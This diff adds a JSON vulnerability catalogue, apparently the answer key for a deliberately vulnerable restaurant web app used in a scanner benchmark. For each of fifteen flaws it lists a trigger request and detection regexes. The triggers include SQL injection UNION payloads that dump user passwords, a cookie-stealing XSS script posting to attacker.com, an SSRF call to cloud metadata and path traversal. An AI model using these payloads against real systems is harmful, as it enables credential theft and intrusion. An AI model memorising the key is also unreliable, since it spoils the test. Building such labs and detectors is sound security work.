@@ -1,0 +1,445 @@
+[
+  {
+    "id": "V01",
+    "type": "SQL Injection",
+    "cwe": "CWE-89",
+    "owasp": "A03:2021",
+    "endpoint": "GET /api/menu/{id}",
+    "param": "id (path)",
+    "trigger": "GET /api/menu/1 UNION SELECT 1,username,email,password,role,image_url,1 FROM users--",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request URL contains SQL UNION or injection metacharacters",
+        "target": "request.url",
+        "pattern": "(?i)(union[\\s%+]+select|'\\s*or\\b|;\\s*drop|--|\\bxp_|information_schema)",
+        "heuristic_name": "sql_metachar_in_url"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains email addresses (user table data leaked)",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_response"
+      },
+      {
+        "strategy": "error_signature",
+        "description": "SQLite error message exposed in response body",
+        "pattern": "(?i)(sqlite|syntax error|no such column|SQLITE_ERROR|near \".{1,20}\")",
+        "heuristic_name": "db_error_leaked"
+      }
+    ],
+    "validation": "Response contains user credentials (email, password) mixed into menu item fields",
+    "severity": "Critical"
+  },
+  {
+    "id": "V02",
+    "type": "SQL Injection",
+    "cwe": "CWE-89",
+    "owasp": "A03:2021",
+    "endpoint": "GET /api/search",
+    "param": "q (query)",
+    "trigger": "GET /api/search?q=' UNION SELECT 1,username,email,password,category,image_url,1 FROM users--",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Search query parameter contains SQL injection metacharacters",
+        "target": "request.url",
+        "pattern": "(?i)(union[\\s%+]+select|'\\s*(or|and)\\b|;\\s*drop|--|0x[0-9a-f]+|\\bchar\\s*\\()",
+        "heuristic_name": "sql_metachar_in_search"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Search response leaks email addresses from users table",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_search_response"
+      },
+      {
+        "strategy": "error_signature",
+        "description": "Database error string in search response indicates injection",
+        "pattern": "(?i)(sqlite|syntax error|no such column|SQLITE_ERROR|unrecognized token)",
+        "heuristic_name": "db_error_in_search"
+      }
+    ],
+    "validation": "Response contains rows with user data leaked through search results",
+    "severity": "Critical"
+  },
+  {
+    "id": "V03",
+    "type": "Stored XSS",
+    "cwe": "CWE-79",
+    "owasp": "A03:2021",
+    "endpoint": "POST /api/reviews",
+    "param": "comment (body)",
+    "trigger": "POST /api/reviews with comment: \"<script>document.location='http://attacker.com/?c='+document.cookie</script>\"",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Review comment contains HTML/script injection tags",
+        "target": "request.body",
+        "pattern": "(?i)(<script|<img[^>]+onerror|<svg[^>]+on\\w+|<iframe|javascript:|on\\w+\\s*=\\s*[\"']?[^\"'>]*[\"']?)",
+        "heuristic_name": "xss_payload_in_comment"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Stored XSS payload returned unescaped in reviews response",
+        "pattern": "(?i)(<script|onerror\\s*=|onload\\s*=|<img[^>]+onerror|javascript:)",
+        "heuristic_name": "unescaped_html_in_review_response"
+      }
+    ],
+    "validation": "Stored payload returned in GET /api/reviews response and rendered in browser DOM via innerHTML, causing script execution",
+    "severity": "High"
+  },
+  {
+    "id": "V04",
+    "type": "SSRF",
+    "cwe": "CWE-918",
+    "owasp": "A10:2021",
+    "endpoint": "POST /api/import-menu",
+    "param": "url (body JSON)",
+    "trigger": "POST /api/import-menu with {\"url\": \"http://169.254.169.254/latest/meta-data/\"}",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Import URL targets a private or metadata IP address",
+        "target": "request.body",
+        "pattern": "(?i)(169\\.254\\.|127\\.0\\.0\\.|10\\.\\d{1,3}\\.|192\\.168\\.|localhost|file://|dict://|gopher://|0\\.0\\.0\\.0)",
+        "heuristic_name": "ssrf_internal_url_in_body"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains bytes_fetched field confirming outbound server request",
+        "fields": ["bytes_fetched"],
+        "heuristic_name": "ssrf_bytes_fetched_present"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains cloud instance metadata keys",
+        "pattern": "(?i)(ami-id|instance-id|meta-data|iam/security-credentials|placement/region)",
+        "heuristic_name": "cloud_metadata_in_response"
+      }
+    ],
+    "validation": "Response contains bytes_fetched > 0, and content from internal/metadata service is returned",
+    "severity": "High"
+  },
+  {
+    "id": "V05",
+    "type": "IDOR / Broken Object Level Authorization",
+    "cwe": "CWE-639",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/orders/{id}",
+    "param": "id (path)",
+    "trigger": "Authenticated as user A (e.g., id=2), GET /api/orders/3 (belongs to user B id=3)",
+    "triggers": [
+      {
+        "strategy": "status_code",
+        "description": "Order endpoint returns 200 allowing cross-user access (no ownership check)",
+        "status_codes": [200],
+        "heuristic_name": "idor_order_200_response"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains user_id field exposing that order belongs to different user",
+        "fields": ["user_id", "total", "status"],
+        "heuristic_name": "order_data_in_response"
+      }
+    ],
+    "validation": "Response returns order data with user_id !== requesting user's session ID",
+    "severity": "High"
+  },
+  {
+    "id": "V06",
+    "type": "IDOR / Broken Object Level Authorization",
+    "cwe": "CWE-639",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/user/profile",
+    "param": "id (query param)",
+    "trigger": "Authenticated as user id=2, GET /api/user/profile?id=1",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Profile response exposes a password field for a different user",
+        "fields": ["password"],
+        "heuristic_name": "password_field_in_profile"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Profile response contains an email address for another user",
+        "pattern": "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,6}",
+        "heuristic_name": "email_in_profile_response"
+      }
+    ],
+    "validation": "Response returns profile of user id=1 (admin) including password field",
+    "severity": "High"
+  },
+  {
+    "id": "V07",
+    "type": "Broken Authentication / Broken Function Level Authorization",
+    "cwe": "CWE-285",
+    "owasp": "A01:2021",
+    "endpoint": "GET /admin/orders, GET /admin/users",
+    "param": "X-Admin-Token (header)",
+    "trigger": "GET /admin/orders with header X-Admin-Token: restaurant-admin-2024 (unauthenticated, or any logged-in user without admin role)",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request includes X-Admin-Token header with any value (hardcoded token bypass)",
+        "target": "request.headers",
+        "header_name": "X-Admin-Token",
+        "pattern": ".+",
+        "heuristic_name": "admin_token_header_present"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Admin endpoint returns 200 without proper role verification",
+        "status_codes": [200],
+        "heuristic_name": "admin_route_200_response"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Admin users response includes password fields for all users",
+        "fields": ["password"],
+        "heuristic_name": "password_in_admin_response"
+      }
+    ],
+    "validation": "Response returns full order/user list including passwords without proper role verification",
+    "severity": "Critical"
+  },
+  {
+    "id": "V08",
+    "type": "Sensitive Data Exposure",
+    "cwe": "CWE-200",
+    "owasp": "A02:2021",
+    "endpoint": "GET /api/user/profile",
+    "param": "id (query param)",
+    "trigger": "GET /api/user/profile?id=1 (any authenticated user)",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Response JSON contains a password field with plaintext value",
+        "fields": ["password"],
+        "heuristic_name": "plaintext_password_in_response"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains what looks like a plaintext password value",
+        "pattern": "\"password\"\\s*:\\s*\"[^\"]{4,}\"",
+        "heuristic_name": "password_value_in_json"
+      }
+    ],
+    "validation": "JSON response contains password field with plaintext password",
+    "severity": "High"
+  },
+  {
+    "id": "V09",
+    "type": "Security Misconfiguration",
+    "cwe": "CWE-489",
+    "owasp": "A05:2021",
+    "endpoint": "GET /api/debug/info",
+    "param": "none",
+    "trigger": "GET /api/debug/info (no auth required)",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Debug response exposes sensitive server internals: admin_token and session_key",
+        "fields": ["admin_token", "session_key"],
+        "heuristic_name": "secrets_in_debug_response"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response body contains recognisable hardcoded secret values",
+        "pattern": "(?i)(restaurant-admin|session[_-]key|admin[_-]token|db[_-]path)",
+        "heuristic_name": "hardcoded_secret_in_response"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Debug endpoint accessible without authentication (200 on unauthenticated request)",
+        "status_codes": [200],
+        "heuristic_name": "debug_endpoint_open"
+      }
+    ],
+    "validation": "Response contains session_key, admin_token, db_path, version, and runtime internals in plaintext",
+    "severity": "Critical"
+  },
+  {
+    "id": "V10",
+    "type": "Mass Assignment",
+    "cwe": "CWE-915",
+    "owasp": "A04:2021",
+    "endpoint": "POST /register, POST /api/user/update",
+    "param": "role (body JSON or query param)",
+    "trigger": "POST /register?role=admin with {\"username\":\"hacker\",\"email\":\"h@h.com\",\"password\":\"pw\"}",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Registration URL contains role parameter set to a privileged value",
+        "target": "request.url",
+        "pattern": "(?i)\\brole\\s*=\\s*(admin|superuser|staff|root|moderator)",
+        "heuristic_name": "privileged_role_in_url"
+      },
+      {
+        "strategy": "pattern_match",
+        "description": "Request body includes a role field set to a privileged value",
+        "target": "request.body",
+        "pattern": "(?i)\"role\"\\s*:\\s*\"(admin|superuser|staff|root|moderator)\"",
+        "heuristic_name": "privileged_role_in_body"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Registration response confirms user was created (user_id present)",
+        "fields": ["user_id"],
+        "heuristic_name": "user_created_with_role"
+      }
+    ],
+    "validation": "New user is created with role=admin. Verified by fetching /api/user/profile?id=<new_id> and seeing role='admin'",
+    "severity": "Critical"
+  },
+  {
+    "id": "V11",
+    "type": "Broken Function Level Authorization",
+    "cwe": "CWE-285",
+    "owasp": "A01:2021",
+    "endpoint": "DELETE /api/menu/{id}",
+    "param": "id (path)",
+    "trigger": "Any authenticated non-admin user sends DELETE /api/menu/1",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request uses DELETE method on a menu endpoint",
+        "target": "request.method",
+        "pattern": "^DELETE$",
+        "heuristic_name": "delete_method_on_menu"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Delete endpoint returns 200 for a non-admin session (no role check)",
+        "status_codes": [200],
+        "heuristic_name": "delete_succeeds_as_non_admin"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response confirms item removal without admin authorisation",
+        "pattern": "(?i)item removed from menu",
+        "heuristic_name": "item_removed_confirmation"
+      }
+    ],
+    "validation": "Response is 200 with 'item removed from menu'. Menu item id=1 no longer appears in GET /api/menu",
+    "severity": "High"
+  },
+  {
+    "id": "V12",
+    "type": "Broken Authentication / Missing Rate Limiting",
+    "cwe": "CWE-307",
+    "owasp": "A07:2021",
+    "endpoint": "POST /login",
+    "param": "email, password (body)",
+    "trigger": "Send 100+ POST /login requests with different passwords within 10 seconds",
+    "triggers": [
+      {
+        "strategy": "status_code",
+        "description": "Login endpoint never responds with 429 (no rate limiting enforced)",
+        "status_codes": [429],
+        "negate": true,
+        "heuristic_name": "no_429_rate_limit_response"
+      },
+      {
+        "strategy": "timing_anomaly",
+        "description": "Login endpoint shows no increasing delay — no exponential backoff",
+        "threshold_ms": 2000,
+        "negate": true,
+        "heuristic_name": "no_timing_backoff"
+      }
+    ],
+    "validation": "All requests return 200 or 401 with no 429 rate limit response; no lockout occurs",
+    "severity": "Medium"
+  },
+  {
+    "id": "V13",
+    "type": "CSRF",
+    "cwe": "CWE-352",
+    "owasp": "A01:2021",
+    "endpoint": "POST /api/orders",
+    "param": "none (no CSRF token expected)",
+    "trigger": "Cross-origin POST /api/orders with valid session cookie and Content-Type: application/json",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "Request includes a cross-origin Origin header (simulating CSRF attack)",
+        "target": "request.headers",
+        "header_name": "Origin",
+        "pattern": "(?i)(http|https)://(?!localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0).{1,100}",
+        "heuristic_name": "cross_origin_header_present"
+      },
+      {
+        "strategy": "status_code",
+        "description": "Order placed successfully despite cross-origin request (no CSRF token checked)",
+        "status_codes": [200, 201],
+        "heuristic_name": "csrf_order_accepted"
+      },
+      {
+        "strategy": "field_presence",
+        "description": "Response contains order_id confirming order was placed without CSRF token",
+        "fields": ["order_id"],
+        "heuristic_name": "order_created_without_csrf_token"
+      }
+    ],
+    "validation": "Order is placed successfully without any CSRF token validation",
+    "severity": "Medium"
+  },
+  {
+    "id": "V14",
+    "type": "Path Traversal",
+    "cwe": "CWE-22",
+    "owasp": "A01:2021",
+    "endpoint": "GET /api/files",
+    "param": "name (query param)",
+    "trigger": "GET /api/files?name=../../go.mod",
+    "triggers": [
+      {
+        "strategy": "pattern_match",
+        "description": "File name parameter contains directory traversal sequences",
+        "target": "request.url",
+        "pattern": "(\\.\\./|\\.\\.(\\\\|%2[Ff]|%5[Cc])|%252[Ff]|%252e%252e)",
+        "heuristic_name": "path_traversal_in_url"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains Go module declaration (go.mod read outside uploads/)",
+        "pattern": "(?i)(module xvulnv2|^go \\d\\.\\d|require \\()",
+        "heuristic_name": "go_module_content_leaked"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains Unix/Linux system file content indicators",
+        "pattern": "(?i)(root:x:0:0|/bin/(sh|bash)|daemon:|nobody:)",
+        "heuristic_name": "system_file_content_leaked"
+      }
+    ],
+    "validation": "Response returns content of go.mod (or any readable file outside uploads/)",
+    "severity": "High"
+  },
+  {
+    "id": "V15",
+    "type": "Insecure Deserialization",
+    "cwe": "CWE-502",
+    "owasp": "A08:2021",
+    "endpoint": "POST /api/cart/restore",
+    "param": "cart_data (body JSON, base64-encoded)",
+    "trigger": "POST /api/cart/restore with cart_data: base64({\"items\":[{\"id\":1}],\"discount\":100,\"promo\":\"STAFFONLY\",\"total\":0})",
+    "triggers": [
+      {
+        "strategy": "field_presence",
+        "description": "Cart response echoes back attacker-controlled discount and promo fields without recalculation",
+        "fields": ["discount", "promo", "total"],
+        "heuristic_name": "client_controlled_cart_fields"
+      },
+      {
+        "strategy": "response_body_match",
+        "description": "Response contains staff-only promo code or manipulated zero total (trust of client data)",
+        "pattern": "(?i)(STAFFONLY|\"discount\":\\s*100|\"total\":\\s*0)",
+        "heuristic_name": "manipulated_cart_values_echoed"
+      }
+    ],
+    "validation": "Response echoes back the deserialized cart including attacker-controlled discount/total fields without server-side recalculation",
+    "severity": "Medium"
+  }
+]
